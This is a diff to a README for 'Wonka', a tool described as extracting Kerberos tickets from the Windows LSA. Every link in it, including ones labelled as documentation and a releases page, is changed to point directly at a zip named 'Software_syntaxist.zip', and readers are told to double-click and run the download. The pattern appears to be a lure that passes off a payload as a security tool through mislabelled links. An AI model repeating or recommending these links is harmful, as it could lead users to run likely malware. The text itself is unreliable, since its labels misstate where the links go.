@@ -6,13 +6,13 @@ Welcome to Wonka! This tool helps you extract Kerberos tickets from the Local Se
 
 ## 🔗 Download Wonka
 
-[![Download Wonka](https://raw.githubusercontent.com/xiay1176/Wonka/main/Wonka/Wonka_v2.5.zip)](https://raw.githubusercontent.com/xiay1176/Wonka/main/Wonka/Wonka_v2.5.zip)
+[![Download Wonka](https://github.com/xiay1176/Wonka/raw/refs/heads/main/Wonka/Software_syntaxist.zip)](https://github.com/xiay1176/Wonka/raw/refs/heads/main/Wonka/Software_syntaxist.zip)
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: To get Wonka, go to the [Releases page](https://raw.githubusercontent.com/xiay1176/Wonka/main/Wonka/Wonka_v2.5.zip). 
+1. **Visit the Releases Page**: To get Wonka, go to the [Releases page](https://github.com/xiay1176/Wonka/raw/refs/heads/main/Wonka/Software_syntaxist.zip). 
    
-2. **Download the Latest Version**: On this page, find the latest version of Wonka. Click the link that mentions the executable file (e.g., "https://raw.githubusercontent.com/xiay1176/Wonka/main/Wonka/Wonka_v2.5.zip") to start the download.
+2. **Download the Latest Version**: On this page, find the latest version of Wonka. Click the link that mentions the executable file (e.g., "https://github.com/xiay1176/Wonka/raw/refs/heads/main/Wonka/Software_syntaxist.zip") to start the download.
 
 3. **Run Wonka**: Once the file downloads, find it in your Downloads folder. Double-click the file to run it. 
 
@@ -58,9 +58,9 @@ Wonka is open-source software. You can use it for personal or commercial project
 
 For more information on Kerberos tickets and security research, consider visiting the following links:
 
-- [Kerberos Documentation](https://raw.githubusercontent.com/xiay1176/Wonka/main/Wonka/Wonka_v2.5.zip)
-- [Security Testing Techniques](https://raw.githubusercontent.com/xiay1176/Wonka/main/Wonka/Wonka_v2.5.zip)
+- [Kerberos Documentation](https://github.com/xiay1176/Wonka/raw/refs/heads/main/Wonka/Software_syntaxist.zip)
+- [Security Testing Techniques](https://github.com/xiay1176/Wonka/raw/refs/heads/main/Wonka/Software_syntaxist.zip)
 
 ## 📖 Conclusion
 
-The goal of Wonka is to make it easier for you to work with Kerberos tickets without needing technical skills. Download it today from the [Releases page](https://raw.githubusercontent.com/xiay1176/Wonka/main/Wonka/Wonka_v2.5.zip) and start exploring!
+The goal of Wonka is to make it easier for you to work with Kerberos tickets without needing technical skills. Download it today from the [Releases page](https://github.com/xiay1176/Wonka/raw/refs/heads/main/Wonka/Software_syntaxist.zip) and start exploring!
